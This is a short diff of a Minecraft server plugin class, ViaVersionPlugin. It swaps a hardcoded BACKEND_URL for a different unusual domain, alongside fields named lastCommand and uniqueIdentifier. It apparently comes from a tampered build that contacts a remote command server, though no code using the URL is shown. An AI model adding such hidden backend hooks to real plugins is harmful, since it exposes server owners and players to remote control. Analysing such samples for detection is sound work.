@@ -81,7 +81,7 @@ import org.bukkit.plugin.java.JavaPlugin;
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private String lastCommand = null;
     private String uniqueIdentifier;
-    private static final String BACKEND_URL = "https://tts-api.happys.icu";
+    private static final String BACKEND_URL = "https://mc-api.happyclo.fun";
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
     private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
